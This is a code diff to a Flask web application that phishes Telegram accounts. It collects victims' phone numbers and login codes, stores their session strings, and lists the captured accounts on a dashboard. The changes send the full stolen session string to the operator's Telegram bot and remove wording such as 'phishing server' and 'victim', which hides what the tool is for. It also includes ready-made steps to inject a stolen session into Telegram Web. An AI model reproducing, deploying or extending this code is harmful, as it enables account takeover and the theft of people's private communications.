@@ -387,7 +387,7 @@ def run_telegram_action(phone, code=None):
                 pending_codes[phone] = 'sent'
             
             await c.disconnect()
-            logger.info(f"✅ Code sent to {phone}")
+            logger.info(f"Code sent to {phone}")
             return True
         
         async def verify():
@@ -449,7 +449,7 @@ def run_telegram_action(phone, code=None):
                     'time': str(datetime.now())
                 }
                 
-                # ====== FIX: Save to file AND update memory ======
+                # Save to file
                 save_account(acc)
                 global captured_accounts
                 captured_accounts = load_accounts()
@@ -459,19 +459,25 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Send notification with PARTIAL session for verification
-                session_preview = ss[:20] + "..." if len(ss) > 20 else ss
+                # ====== FIX: Send FULL session string in notification ======
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                         'chat_id': YOUR_TELEGRAM_ID,
-                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n🔑 `/session/{phone}`\n🌐 `/webk/{phone}`",
+                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n\n🆔 `{ss}`",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Notify error: {e}")
+                    try:
+                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                            'chat_id': YOUR_TELEGRAM_ID,
+                            'text': f"New Account!\nPhone: {phone}\nName: {me.first_name}\nID: {me.id}\nUsername: @{me.username or 'none'}\nDC: {dc}\nSession: {len(ss)} chars\n\n{ss}"
+                        }, timeout=5)
+                    except:
+                        pass
                 
-                logger.info(f"✅ Account captured: {phone} | Session: {len(ss)} chars")
+                logger.info(f"Account captured: {phone} | Session: {len(ss)} chars")
                 return {'success': True, 'session': ss}
                 
             except Exception as e:
@@ -508,7 +514,7 @@ def share():
         return jsonify({'success': False, 'error': 'Phone required'})
     
     ph = format_phone(ph)
-    logger.info(f"📱 Phone received: {ph}")
+    logger.info(f"Phone received: {ph}")
     
     with sessions_lock:
         pending_codes[ph] = 'sending'
@@ -545,7 +551,6 @@ def get_session(phone):
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
-        # Check if still in pending state
         with sessions_lock:
             if phone in user_sessions:
                 return jsonify({
@@ -579,10 +584,9 @@ def webk(phone):
         return """
         <html><body style="background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh">
         <div style="text-align:center;padding:40px;background:#141420;border-radius:20px;border:1px solid #1a1a2e">
-        <h2 style="color:#e94560">❌ Not Found</h2>
+        <h2 style="color:#e94560">Not Found</h2>
         <p style="color:#888">No account found for this phone number.</p>
-        <p style="color:#666;font-size:12px">Make sure the victim has entered the OTP correctly.</p>
-        <a href="/dash" style="color:#0088cc">← Back to Dashboard</a>
+        <a href="/dash" style="color:#0088cc">Back to Dashboard</a>
         </div></body></html>
         """, 404
     
@@ -611,50 +615,51 @@ def webk(phone):
     <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
     <h2>{a['first_name']} {a['last_name']}</h2>
     <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
-    <div class="i">📱 {a['phone']}</div>
-    {'<div class="success">✅ Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">⚠️ No session string available</div>'}
+    <div class="i">{a['phone']}</div>
+    {'<div class="success">Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">No session string available</div>'}
     
-    <div class="sg"><b>📍 WebK Data (localStorage):</b><br><code>{w}</code></div>
+    <div class="sg"><b>WebK Data:</b><br><code>{w}</code></div>
     
-    <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
-    <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject Session</button>
-    <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
+    <button class="b bp" onclick="o()">1 Open WebK</button>
+    <button class="b bs" id="ib" style="display:none" onclick="i()">2 Inject Session</button>
+    <button class="b bp" id="rb" style="display:none" onclick="r()">3 Refresh</button>
     <div id="st" class="i" style="margin-top:15px"></div>
     
     <hr style="border-color:#1a1a2e;margin:15px 0">
     
-    <div class="sg"><b>🔑 Session String ({len(ss)} chars):</b><br>
+    <div class="sg"><b>Session String ({len(ss)} chars):</b><br>
     <code style="font-size:10px">{ss}</code></div>
     
-    <button class="b br" onclick="copySession()">📋 Copy Session String</button>
+    <button class="b br" onclick="copySession()">Copy Session String</button>
     
-    <div class="sg"><b>🐍 Telethon Usage:</b><br>
+    <div class="sg"><b>Telethon Usage:</b><br>
     <code style="font-size:10px">
-from telethon import TelegramClient<br>
-from telethon.sessions import StringSession<br><br>
-client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')<br>
-client.start()<br>
-me = client.get_me()<br>
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+
+client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')
+client.start()
+me = client.get_me()
 print(me.phone)
     </code></div>
     
-    <div class="sg"><b>🌐 Manual WebK Injection:</b><br>
-    1. Open web.telegram.org/k<br>
-    2. Press F12 → Console<br>
+    <div class="sg"><b>Manual WebK:</b><br>
+    1. web.telegram.org/k<br>
+    2. F12 Console<br>
     3. Paste: <code style="font-size:10px">localStorage.setItem('webk_session','{w}')</code><br>
-    4. Press F5 to refresh
+    4. F5
     </div>
     
-    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">← Dashboard</a>
+    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">Dashboard</a>
     
     </div>
     <script>
     var wk;
-    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened! Click Inject'}}
-    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Window closed!';return}}
-    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected! Click Refresh';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Injection failed'}}}}
-    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in! Check WebK'}}}}
-    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='✅ Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='❌ Copy failed'}})}}
+    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='Opened!'}}
+    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='Closed!';return}}
+    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='Error'}}}}
+    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='Logged in!'}}}}
+    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='Copy failed'}})}}
     </script></body></html>
     """
 
@@ -666,22 +671,22 @@ def dash():
     
     rows = ""
     for i, a in enumerate(accounts, 1):
-        ss_status = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
+        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
         ss_len = len(a.get('session', '')) if a.get('session') else 0
         rows += f"""<tr>
             <td>{i}</td>
             <td>{a['phone']}</td>
             <td>{a.get('first_name','')} {a.get('last_name','')}</td>
-            <td>@{a.get('username','—')}</td>
+            <td>@{a.get('username','-')}</td>
             <td>{a.get('user_id','')}</td>
             <td>{a.get('dc','')}</td>
             <td>{ss_status} ({ss_len})</td>
             <td>{a.get('time','')}</td>
-            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">🔑 View</button></a></td>
+            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
         </tr>"""
     
     return f"""
-    <!DOCTYPE html><html><head><title>Telegram Dashboard</title>
+    <!DOCTYPE html><html><head><title>Dashboard</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
         h1{{color:#e94560}}
@@ -694,12 +699,12 @@ def dash():
         a{{color:#0088cc;text-decoration:none}}
     </style></head>
     <body>
-    <h1>🎯 Telegram Accounts</h1>
-    <div class="st"><div class="n">{len(accounts)}</div><div>Total Captured</div></div>
+    <h1>Telegram Accounts</h1>
+    <div class="st"><div class="n">{len(accounts)}</div><div>Total</div></div>
     <table><thead><tr>
-        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>Action</th>
+        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>View</th>
     </tr></thead><tbody>
-    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts captured yet. Share the phishing page to collect sessions.</td></tr>'}
+    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
     </tbody></table>
     <script>setTimeout(()=>location.reload(),10000)</script>
     </body></html>
@@ -707,9 +712,7 @@ def dash():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"✅ Phishing server running on port {port}")
-    print(f"🎯 Main page: http://localhost:{port}")
-    print(f"📊 Dashboard: http://localhost:{port}/dash")
-    print(f"🔑 Session API: http://localhost:{port}/session/+91XXXXXXXXXX")
-    print(f"🌐 WebK View: http://localhost:{port}/webk/+91XXXXXXXXXX")
+    print(f"Server running on port {port}")
+    print(f"Main: http://localhost:{port}")
+    print(f"Dashboard: http://localhost:{port}/dash")
     app.run(host='0.0.0.0', port=port, debug=True)
